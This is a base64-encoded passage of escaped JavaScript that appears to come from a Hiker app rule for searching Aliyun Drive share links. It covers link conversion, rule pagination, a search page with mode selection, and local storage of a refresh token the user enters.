cIlxcXFxcXFwiKTtcXFxcbiAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgIHNoYXJlSWQgPSBhbGlVcmwuc3BsaXQoXFxcXFxcXCIvXFxcXFxcXCIpWzRdO1xcXFxuICAgICAgICAgICAgcmV0dXJuICdzbWFydGRyaXZlOi8vc2hhcmUvYnJvd3NlP3NoYXJlSWQ9JyArIHNoYXJlSWQgKyAnJnNoYXJlUHdkPScgKyAoc2hhcmVQd2QgfHwgXFxcXFxcXCJcXFxcXFxcIik7XFxcXG4gICAgICAgIH1cXFxcbiAgICB9IGVsc2UgaWYgKGFsaVVybC5zdGFydHNXaXRoKFxcXFxcXFwiaHR0cFxcXFxcXFwiKSkge1xcXFxuICAgICAgICByZXR1cm4gXFxcXFxcXCJ3ZWI6Ly9cXFxcXFxcIiArIGFsaVVybDtcXFxcbiAgICB9IGVsc2Uge1xcXFxuICAgICAgICByZXR1cm4gYWxpVXJsO1xcXFxuICAgIH1cXFxcbn1cXFxcblxcXFxuZnVuY3Rpb24gZ2V0TW9kZVVybChhbGlVcmwsIHNoYXJlUHdkLCBvcGVuTW9kZSkge1xcXFxuICAgIGlmIChhbGlVcmwuaW5jbHVkZXMoXFxcXFxcXCJ3d3cuYWxpeXVuZHJpdmUuY29tL3MvXFxcXFxcXCIpKSB7XFxcXG4gICAgICAgIGlmIChvcGVuTW9kZSA9PT0gXFxcXFxcXCLmnKzlnLDovaznoIFcXFxcXFxcIikge1xcXFxuICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL3BhZ2UvYWxpeXVuP3BhZ2U9ZnlwYWdlJnJ1bGU9JyArIE1ZX1JVTEUudGl0bGUgKyAnJnJlYWx1cmw9JyArIGVuY29kZVVSSUNvbXBvbmVudChhbGlVcmwpICsgXFxcXFxcXCImc2hhcmVQd2Q9XFxcXFxcXCIgKyAoc2hhcmVQd2QgfHwgXFxcXFxcXCJcXFxcXFxcIik7XFxcXG4gICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICBzaGFyZUlkID0gYWxpVXJsLnNwbGl0KFxcXFxcXFwiL1xcXFxcXFwiKVs0XTtcXFxcbiAgICAgICAgICAgIHJldHVybiAnc21hcnRkcml2ZTovL3NoYXJlL2Jyb3dzZT9zaGFyZUlkPScgKyBzaGFyZUlkICsgJyZzaGFyZVB3ZD0nICsgKHNoYXJlUHdkIHx8IFxcXFxcXFwiXFxcXFxcXCIpO1xcXFxuICAgICAgICB9XFxcXG4gICAgfSBlbHNlIGlmIChhbGlVcmwuc3RhcnRzV2l0aChcXFxcXFxcImh0dHBcXFxcXFxcIikpIHtcXFxcbiAgICAgICAgcmV0dXJuIFxcXFxcXFwid2ViOi8vXFxcXFxcXCIgKyBhbGlVcmw7XFxcXG4gICAgfSBlbHNlIHtcXFxcbiAgICAgICAgcmV0dXJuIGFsaVVybDtcXFxcbiAgICB9XFxcXG59XFxcXG5cXFxcbiQuZXhwb3J0cy5jYXJyeVJ1bGUgPSBmdW5jdGlvbihydWxlLCBzLCBwYWdlLCBzZWFyY2hNb2RlLCBvcGVuTW9kZSkge1xcXFxuICAgIGxldCBsaXN0ID0gcnVsZS5maW5kKHMsIHBhZ2UpO1xcXFxuICAgIGlmICghbGlzdCkgcmV0dXJuIFtdO1xcXFxuICAgIGxldCB1cmxMYXp5ID0gJChcXFxcXFxcIlxcXFxcXFwiKS5sYXp5UnVsZShkb3VibGVUcmVhdGluZywgb3Blbk1vZGUsIHJ1bGUuZmluZEFsaVVybCwgTVlfUlVMRS50aXRsZSk7XFxcXG4gICAgbGV0IGRlc2NUaXBzID0gXFxcXFxcXCLigJzigJzigJ3igJ1cXFxcXFxcIiArIHJ1bGUubmFtZS5mb250Y29sb3IoXFxcXFxcXCIjZjEzYjY2YVxcXFxcXFwiKSArIFxcXFxcXFwiJm5ic3A7XFxcXFxcXCI7XFxcXG4gICAgbGV0IHJlc0xpc3QgPSBbXTtcXFxcblxcXFxuICAgIGZvciAobGV0IGl0IG9mIGxpc3QpIHtcXFxcbiAgICAgICAgaWYgKGl0LnNraXApIHtcXFxcbiAgICAgICAgICAgIHJlc0xpc3QucHVzaChpdCk7XFxcXG4gICAgICAgICAgICBjb250aW51ZTtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBpZiAoc2VhcmNoTW9kZSAmJiAhc2VhcmNoQ29udGFpbnMoaXQudGl0bGUsIHMsIHRydWUpKSBjb250aW51ZTtcXFxcbiAgICAgICAgaXQudXJsID0gcnVsZS5maW5kQWxpVXJsID8gaXQudXJsICsgdXJsTGF6eSA6IGdldE1vZGVVcmwoaXQudXJsLCBpdC5zaGFyZVB3ZCB8fCBcXFxcXFxcIlxcXFxcXFwiLCBvcGVuTW9kZSk7XFxcXG4gICAgICAgIHJlc0xpc3QucHVzaCh7XFxcXG4gICAgICAgICAgICB0aXRsZTogaXQudGl0bGUuaW5jbHVkZXMoXFxcXFxcXCLigJzigJzigJ3igJ1cXFxcXFxcIikgPyBpdC50aXRsZSA6IFxcXFxcXFwi4oCc4oCc4oCd4oCdXFxcXFxcXCIgKyBpdC50aXRsZS5yZXBsYWNlKG5ldyBSZWdFeHAoXFxcXFxcXCI8ZW0+fDwvZW0+XFxcXFxcXCIsIFxcXFxcXFwiZ1xcXFxcXFwiKSwgXFxcXFxcXCJcXFxcXFxcIikucmVwbGFjZShuZXcgUmVnRXhwKHMsIFxcXFxcXFwiZ1xcXFxcXFwiKSwgXFxcXFxcXCI8c3Ryb25nPjxzcGFuIHN0eWxlPVxcXFxcXFxcXFxcXFxcXCJjb2xvcjogIzFFOTBGRlxcXFxcXFxcXFxcXFxcXCI+XFxcXFxcXCIgKyBzICsgXFxcXFxcXCI8L3NwYW4+PC9zdHJvbmc+XFxcXFxcXCIpLFxcXFxuICAgICAgICAgICAgZGVzYzogZGVzY1RpcHMgKyBpdC5kZXNjLFxcXFxuICAgICAgICAgICAgdXJsOiBpdC51cmwsXFxcXG4gICAgICAgICAgICBwaWNfdXJsOiBpdC5waWNfdXJsLFxcXFxuICAgICAgICAgICAgY29sX3R5cGU6IGl0LnBpY191cmwgPyAnbW92aWVfMV92ZXJ0aWNhbF9waWMnIDogXFxcXFxcXCJ0ZXh0XzFcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIGV4dHJhOiBPYmplY3QuYXNzaWduKHtcXFxcbiAgICAgICAgICAgICAgICBpbmhlcml0VGl0bGU6IGZhbHNlXFxcXG4gICAgICAgICAgICB9LCBpdC5leHRyYSlcXFxcbiAgICAgICAgfSk7XFxcXG4gICAgfVxcXFxuICAgIHJldHVybiByZXNMaXN0O1xcXFxufVxcXFxubGV0IHNpemUgPSAxMDtcXFxcbiQuZXhwb3J0cy5nZXREYXRhID0gZnVuY3Rpb24ocGFnZSwgcnVsZSkge1xcXFxuICAgIGlmICghcGFnZSAmJiAhcnVsZSkge1xcXFxuICAgICAgICByZXR1cm4gcnVsZXMubWFwKGl0ID0+IGl0Lm5hbWUpO1xcXFxuICAgIH1cXFxcbiAgICBpZiAocnVsZSAhPSBudWxsKSB7XFxcXG4gICAgICAgIGlmIChwYWdlICE9IG51bGwgJiYgcGFnZSA+IDEpIHtcXFxcbiAgICAgICAgICAgIHJldHVybiBydWxlcy5maWx0ZXIoaSA9PiBpLm5hbWUgPT0gcnVsZSAmJiBpLnBhZ2UpO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIHJldHVybiBydWxlcy5maWx0ZXIoaSA9PiBpLm5hbWUgPT0gcnVsZSk7XFxcXG4gICAgfVxcXFxuICAgIGxldCBzdGFydCA9IChwYWdlIC0gMSkgKiBzaXplO1xcXFxuICAgIGlmIChydWxlcy5sZW5ndGggPCBzdGFydCArIDEpIHtcXFxcbiAgICAgICAgcmV0dXJuIFtdO1xcXFxuICAgIH1cXFxcbiAgICBsZXQgbGVuID0gc2l6ZTtcXFxcbiAgICBpZiAocnVsZXMubGVuZ3RoIDwgcGFnZSAqIHNpemUpIHtcXFxcbiAgICAgICAgbGVuID0gcnVsZXMubGVuZ3RoIC0gc3RhcnRcXFxcbiAgICB9XFxcXG4gICAgcmV0dXJuIHJ1bGVzLnNsaWNlKHN0YXJ0LCBzdGFydCArIGxlbik7XFxcXG59XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi5pCc57Si6aG16Z2iXFxcIixcXFwicGF0aFxcXCI6XFxcInNvdVxcXCIsXFxcInJ1bGVcXFwiOlxcXCJqczpcXFxcbmZ1bmN0aW9uIHNldEhlYWQoKSB7XFxcXG4gICAgaWYgKG9wZW5Nb2RlID09IFxcXFxcXFwi5pys5Zyw6L2s56CBXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgbGV0IGFsaVRva2Vuc0ZpbGVwYXRoID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL3Rva2VuUGF0aFxcXFxcXFwiKS5hbGlUb2tlbnNGaWxlcGF0aDtcXFxcbiAgICAgICAgbGV0IGEgPSBmZXRjaChhbGlUb2tlbnNGaWxlcGF0aCk7XFxcXG4gICAgICAgIGlmICghYSB8fCBhID09IFxcXFxcXFwiXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgICAgIGQucHVzaCh7XFxcXG4gICAgICAgICAgICAgICAgdGl0bGU6ICc8Zm9udCBjb2xvcj1cXFxcXFxcIiMxM0I2MUJcXFxcXFxcIj7ilpAgPC9mb250PjxiPua4qemmqOaPkOekujxiPicsXFxcXG4gICAgICAgICAgICAgICAgdXJsOiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJyaWNoX3RleHRcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgICB1cmw6IFxcXFxcXFwiaGlrZXI6Ly9wYWdlL2xvZ2luI25vUmVjb3JkSGlzdG9yeSMjbm9IaXN0b3J5I1xcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfMVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIuacquajgOa1i+WIsOeZu+W9leS/oeaBr++8jOeCueaIkei3s+i9rOeZu+W9lei0puWPt+mhtemdou+8jOeZu+W9lemYv+mHjOS6keebmOi0puWPt+WQjuaWueWPr+S9v+eUqOacrOWcsOi9rOeggeaooeW8j1xcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHBhZ2VUaXRsZTogXFxcXFxcXCLnmbvlvZXpmL/ph4zkupHnm5hcXFxcXFxcIlxcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICB9XFxcXG4gICAgfVxcXFxuICAgIGFkZExpc3RlbmVyKFxcXFxcXFwib25DbG9zZVxcXFxcXFwiLCAkLnRvU3RyaW5nKCgpID0+IHtcXFxcbiAgICAgICAgY2xlYXJNeVZhcihcXFxcXFxcInNcXFxcXFxcIik7XFxcXG4gICAgfSkpO1xcXFxuICAgIGQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiBcXFxcXFxcIuaQnOe0ou+8mlxcXFxcXFwiICsgW1xcXFxcXFwi6buY6K6kXFxcXFxcXCIsIFxcXFxcXFwi57K+5YeGXFxcXFxcXCJdW3NlYXJjaE1vZGVdLFxcXFxuICAgICAgICB1cmw6ICQoXFxcXFxcXCIjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZSgoKSA9PiB7XFxcXG4gICAgICAgICAgICBzZXRTZWFyY2hNb2RlKGdldFNlYXJjaE1vZGUoKSA/IDAgOiAxKTtcXFxcbiAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXFxcbiAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIlxcXFxuICAgICAgICB9KSxcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwiaWNvbl8yX3JvdW5kXFxcXFxcXCIsXFxcXG4gICAgICAgIGRlc2M6IFxcXFxcXFwiXFxcXFxcXCIsXFxcXG4gICAgICAgIHBpY191cmw6IFxcXFxcXFwiaGlrZXI6Ly9pbWFnZXMvaWNvbl9zZWFyY2g2XFxcXFxcXCJcXFxcbiAgICB9KTtcXFxcblxcXFxuICAgIGQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiBcXFxcXFxcIuaooeW8j++8mlxcXFxcXFwiICsgb3Blbk1vZGUsXFxcXG4gICAgICAgIHVybDogXFxcXFxcXCJzZWxlY3Q6Ly9cXFxcXFxcIiArIEpTT04uc3RyaW5naWZ5KHtcXFxcbiAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIumAieaLqeaooeW8j1xcXFxcXFwiLFxcXFxuICAgICAgICAgICAgb3B0aW9uczogW1xcXFxcXFwi5qih5byP77ya5pys5Zyw6L2s56CBXFxcXFxcXCIsIFxcXFxcXFwi5qih5byP77ya5a6Y5pa5QVBQXFxcXFxcXCIsIFxcXFxcXFwi55m75b2V6LSm5Y+3MVxcXFxcXFwiLCBcXFxcXFxcIueZu+W9lei0puWPtzJcXFxcXFxcIiwgXFxcXFxcXCJUb2tlbueZu+W9lVxcXFxcXFwiLCBcXFxcXFxcIueZu+W9leS/oeaBr1xcXFxcXFwiXSxcXFxcbiAgICAgICAgICAgIGNvbDogMSxcXFxcbiAgICAgICAgICAgIGpzOiAkLnRvU3RyaW5nKCgpID0+IHtcXFxcbiAgICAgICAgICAgICAgICBpZiAoXFxcXFxcXCLnmbvlvZXotKblj7cxXFxcXFxcXCIgPT0gaW5wdXQpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9wYWdlL2xvZ2luI25vUmVjb3JkSGlzdG9yeSMjbm9IaXN0b3J5Iz9wYWdlVGl0bGU955m75b2V6Zi/6YeM5LqR55uYXFxcXFxcXCJcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgaWYgKFxcXFxcXFwi55m75b2V6LSm5Y+3MlxcXFxcXFwiID09IGlucHV0KSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vcGFnZS9sb2dpbiNub1JlY29yZEhpc3RvcnkjI25vSGlzdG9yeSM/aW5kZXg9MCZwYWdlVGl0bGU955m75b2V6Zi/6YeM5LqR55uYXFxcXFxcXCJcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgaWYgKFxcXFxcXFwiVG9rZW7nmbvlvZVcXFxcXFxcIiA9PSBpbnB1dCkge1xcXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gJChcXFxcXFxcIlxcXFxcXFwiLCBcXFxcXFxcIui+k+WFpVRva2VuXFxcXFxcXCIpLmlucHV0KCgpID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBhbGlUb2tlbnNGaWxlcGF0aCA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS90b2tlblBhdGhcXFxcXFxcIikuYWxpVG9rZW5zRmlsZXBhdGg7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgYWxpVG9rZW4gPSB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaF90b2tlbjogaW5wdXQudHJpbSgpXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB9O1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgd3JpdGVGaWxlKGFsaVRva2Vuc0ZpbGVwYXRoLCBKU09OLnN0cmluZ2lmeShhbGlUb2tlbikpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIGlmIChcXFxcXFxcIueZu+W9leS/oeaBr1xcXFxcXFwiID09IGlucHV0KSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGxldCBhbGlUb2tlbnNGaWxlcGF0aCA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS90b2tlblBhdGhcXFxcXFxcIikuYWxpVG9rZW5zRmlsZXBhdGg7XFxcXG4gICAgICAgICAgICAgICAgICAgIGlmICghZmlsZUV4aXN0KGFsaVRva2Vuc0ZpbGVwYXRoKSkgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/ov5jmnKrnmbvpmYZcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgICAgICAgICAgbGV0IGFsaSA9IHJlcXVlc3QoYWxpVG9rZW5zRmlsZXBhdGgpO1xcXFxuICAgICAgICAgICAgICAgICAgICB0cnkge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgYWxpID0gSlNPTi5wYXJzZShhbGkpO1xcXFxuICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBkZWxldGVGaWxlKGFsaVRva2Vuc0ZpbGVwYXRoKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v6I635Y+W5aSx6LSlXFxcXFxcXCI7XFxcXG4gICAgICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICAgICAgY29uZmlybSh7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogJ+eZu+W9leS/oeaBrycsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBjb250ZW50OiBcXFxcXFxcIueUqOaItzpcXFxcXFxcIiArIChhbGkubmlja19uYW1lIHx8IGFsaS51c2VyX25hbWUgfHwgXFxcXFxcXCJUb2tlbueZu+W9lVxcXFxcXFwiKSArIFxcXFxcXFwiXFxcXFxcXFxuVG9rZW46XFxcXFxcXCIgKyBhbGkucmVmcmVzaF90b2tlbiArIFxcXFxcXFwiXFxcXFxcXFxuKOWPlua2iO+8muazqOmUgOeZu+W9le+8m+ehruWumu+8muWkjeWItlRva2VuKVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgY29uZmlybTogJC50b1N0cmluZygodG9rZW4pID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJjb3B5Oi8vXFxcXFxcXCIgKyB0b2tlbjtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIH0sIGFsaS5yZWZyZXNoX3Rva2VuKSxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGNhbmNlbDogJC50b1N0cmluZygocGF0aCkgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAkKFxcXFxcXFwi56Gu6K6k5rOo6ZSA55m75b2VXFxcXFxcXCIpLmNvbmZpcm0oKHBhdGgpID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVsZXRlRmlsZShwYXRoKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LCBwYXRoKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIH0sIGFsaVRva2Vuc0ZpbGVwYXRoKVxcXFxuICAgICAgICAgICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuO1xcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICBpbnB1dCA9IGlucHV0LnJlcGxhY2UoXFxcXFxcXCLmqKHlvI/vvJpcXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgc2V0SXRlbShcXFxcXFxcIm9wZW5Nb2RlXFxcXFxcXCIsIGlucHV0KTtcXFxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcXFxuICAgICAgICAgICAgICAgIGlmIChpbnB1dCA9PSBcXFxcXFxcIuWumOaWuUFQUFxcXFxcXFwiKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5L+u5pS55oiQ5Yqf77yM6K+356Gu5L+d5omL5py65pyJ5a6J6KOF6Zi/6YeM5LqR55uY5a6Y5pa5QVBQXFxcXFxcXCI7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfSlcXFxcbiAgICAgICAgfSksXFxcXG4gICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImljb25fMl9yb3VuZFxcXFxcXFwiLFxcXFxuICAgICAgICBkZXNjOiBcXFxcXFxcIlxcXFxcXFwiLFxcXFxuICAgICAgICBwaWNfdXJsOiBcXFxcXFxcImhpa2VyOi8vaW1hZ2VzL2ljb25fbWVudTZcXFxcXFxcIlxcXFxuICAgIH0pO1xcXFxuXFxcXG4gICAgZC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6ICfmkJzntKInLFxcXFxuICAgICAgICBkZXNjOiAn6K+36L6T5YWl5YWz6ZSu6K+NL+mTvuaOpScsXFxcXG4gICAgICAgIGNvbF90eXBlOiAnaW5wdXQnLFxcXFxuICAgICAgICB1cmw6ICQudG9TdHJpbmcoKCkgPT4ge1xcXFxuICAgICAgICAgICAgaW5wdXQgPSBnZXRNeVZhcihcXFxcXFxcInNcXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIikgfHwgaW5wdXQ7XFxcXG4gICAgICAgICAgICBpbnB1dCA9IGlucHV0LnRyaW0oKTtcXFxcbiAgICAgICAgICAgIGlmIChpbnB1dC5zdGFydHNXaXRoKFxcXFxcXFwiaHR0cHM6Ly93d3cuYWxpeXVuZHJpdmUuY29tL3MvXFxcXFxcXCIpKSB7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9wYWdlL2FsaXl1bj9wYWdlVGl0bGU95omT5byA6ZO+5o6lJnBhZ2U9ZnlwYWdlJnJlYWx1cmw9XFxcXFxcXCIgKyBlbmNvZGVVUklDb21wb25lbnQoaW5wdXQpO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgcHV0TXlWYXIoJ3MnLCBpbnB1dCk7XFxcXG4gICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcXFxuICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcXFxuICAgICAgICB9KSxcXFxcbiAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgIG9uQ2hhbmdlOiBcXFxcXFxcInB1dE15VmFyKCdzJyxpbnB1dClcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIGlkOiBpZCArIFxcXFxcXFwic3NcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIGRlZmF1bHRWYWx1ZTogc1xcXFxuICAgICAgICB9XFxcXG4gICAgfSk7XFxcXG4gICAgbGV0IHJ1bGVzID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL2RhdGFcXFxcXFxcIikuZ2V0RGF0YSgpO1xcXFxuICAgIGQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiBcXFxcXFxcIvCfjJ9cXFxcXFxcIixcXFxcbiAgICAgICAgdXJsOiBcXFxcXFxcImhpa2VyOi8vY29sbGVjdGlvbj9ydWxlPVxcXFxcXFwiICsgTVlfUlVMRS50aXRsZSxcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwic2Nyb2xsX2J1dHRvblxcXFxcXFwiLFxcXFxuICAgIH0sIHtcXFxcbiAgICAgICAgdGl0bGU6IFxcXFxcXFwiXFxcXFxcXCIgPT0gciA/IFxcXFxcXFwi4oCc4oCc5YWo6YOo4oCd4oCdXFxcXFxcXCIgOiBcXFxcXFxcIuWFqOmDqFxcXFxcXFwiLFxcXFxuICAgICAgICB1cmw6ICQoXFxcXFxcXCIjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZSgocywgaWQpID0+IHtcXFxcbiAgICAgICAgICAgIGxldCBxciA9IGdldEl0ZW0oXFxcXFxcXCJydWxlXFxcXFxcXCIsIFxcXFxcXFwiXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgY2xlYXJJdGVtKFxcXFxcXFwicnVsZVxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgIGlmIChzKSB7XFxcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcbiAgICAgICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICAgICAgdXBkYXRlSXRlbShcXFxcXFxcIuWFqOmDqFxcXFxcXFwiICsgaWQsIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi4oCc4oCc5YWo6YOo4oCd4oCdXFxcXFxcXCJcXFxcbiAgICAgICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgICAgICBpZiAocXIpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdXBkYXRlSXRlbShpZCArIHFyLCB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogcXJcXFxcbiAgICAgICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiXFxcXG4gICAgICAgIH0sIHMsIGlkKSxcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwic2Nyb2xsX2J1dHRvblxcXFxcXFwiLFxcXFxuICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgaWQ6IFxcXFxcXFwi5YWo6YOoXFxcXFxcXCIgKyBpZFxcXFxuICAgICAgICB9XFxcXG4gICAgfSk7XFxcXG4gICAgZm9yIChsZXQgaXQgb2YgcnVsZXMpIHtcXFxcbiAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgIHRpdGxlOiBpdCA9PSByID8gXFxcXFxcXCLigJzigJxcXFxcXFxcIiArIGl0ICsgXFxcXFxcXCLigJ3igJ1cXFxcXFxcIiA6IGl0LFxcXFxuICAgICAgICAgICAgdXJsOiAkKFxcXFxcXFwiI25vTG9hZGluZyNcXFxcXFxcIikubGF6eVJ1bGUoKHIsIHMsIGlkKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IHFyID0gZ2V0SXRlbShcXFxcXFxcInJ1bGVcXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgc2V0SXRlbShcXFxcXFxcInJ1bGVcXFxcXFxcIiwgcik7XFxcXG4gICAgICAgICAgICAgICAgaWYgKHMpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgICAgICB1cGRhdGVJdGVtKHFyID8gKGlkICsgcXIpIDogKFxcXFxcXFwi5YWo6YOoXFxcXFxcXCIgKyBpZCksIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBxciB8fCBcXFxcXFxcIuWFqOmDqFxcXFxcXFwiXFxcXG4gICAgICAgICAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgICAgICAgICB1cGRhdGVJdGVtKGlkICsgciwge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi4oCc4oCcXFxcXFxcXCIgKyByICsgXFxcXFxcXCLigJ3igJ1cXFxcXFxcIlxcXFxuICAgICAgICAgICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiXFxcXG4gICAgICAgICAgICB9LCBpdCwgcywgaWQpLFxcXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwic2Nyb2xsX2J1dHRvblxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgZGVzYzogXFxcXFxcXCJcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIHBpY191cmw6IFxcXFxcXFwiXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgICAgIGlkOiBpZCArIGl0XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH0pO1xcXFxuICAgIH1cXFxcblxcXFxufVxcXFxuXFxcXG5mdW5jdGlvbiByZWNvcmQoKSB7XFxcXG4gICAgbGV0IGhpc3RvcnkgPSBzdG9yYWdlMC5nZXRJdGVtKFxcXFxcXFwic2VhcmNoSGlzdG9yeVxcXFxcXFwiLCBbXSk7XFxcXG4gICAgbGV0IGlpID0gaGlzdG9yeS5pbmRleE9mKHMpO1xcXFxuICAgIGlmIChpaSA+IC0xKSB7XFxcXG4gICAgICAgIGhpc3Rvcnkuc3BsaWNlKGlpLCAxKTtcXFxcbiAgICB9XFxcXG4gICAgaWYgKGhpc3RvcnkubGVuZ3RoID4gMjAp